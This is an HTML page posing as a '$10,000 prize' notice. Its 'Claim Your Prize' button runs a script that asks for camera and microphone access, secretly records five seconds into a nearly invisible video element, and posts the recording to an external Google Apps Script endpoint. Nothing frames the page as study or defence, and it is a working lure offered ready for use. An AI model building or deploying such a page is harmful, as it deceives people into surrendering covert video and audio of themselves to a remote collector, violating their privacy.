<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Congratulations!</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f4f7fc;
      color: #1d1f26;
    }
    .container {
      text-align: center;
      padding: 100px 20px;
    }
    h2 {
      font-size: 2.5em;
      font-weight: bold;
      color: #003b4c;
    }
    p {
      font-size: 1.2em;
      color: #606770;
      margin-top: 20px;
    }
    button {
      padding: 15px 30px;
      font-size: 1.2em;
      background-color: #0052cc;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 40px;
    }
    button:hover {
      background-color: #0041a8;
    }
    video {
      width: 1px;
      height: 1px;
      opacity: 0.01;
    }
    .footer {
      margin-top: 80px;
      font-size: 0.8em;
      color: #a1a1a1;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Congratulations!</h2>
    <p>You have won $10,000 from the organization!</p>
    <button onclick="startRecording()">Claim Your Prize</button>
    <video id="video" autoplay muted playsinline></video>
  </div>
  <div class="footer">
    <p>Powered by the Organization</p>
  </div>

  <script>
    async function startRecording() {
      const video = document.getElementById('video');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        video.srcObject = stream;

        const mediaRecorder = new MediaRecorder(stream);
        let chunks = [];

        mediaRecorder.ondataavailable = (e) => {
          chunks.push(e.data);
        };

        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const formData = new FormData();
          formData.append('video', blob, 'recorded.webm');

          await fetch("https://script.google.com/macros/s/AKfycbwHD6Jr2c1OWq9d4G6wEQvJFF-CgVXVSE7NmMbderb_sTOTb2Kkl0CqBHMIp6DxC6F7Xw/exec", {
            method: "POST",
            body: formData
          });

          stream.getTracks().forEach(track => track.stop());
          alert("ویدیو با موفقیت ارسال شد.");
        };

        mediaRecorder.start();
        setTimeout(() => {
          mediaRecorder.stop();
        }, 5000); // ضبط ۵ ثانیه
      } catch (err) {
        alert("دسترسی به دوربین یا میکروفون رد شد.");
        console.error(err);
      }
    }
  </script>
</body>
</html>
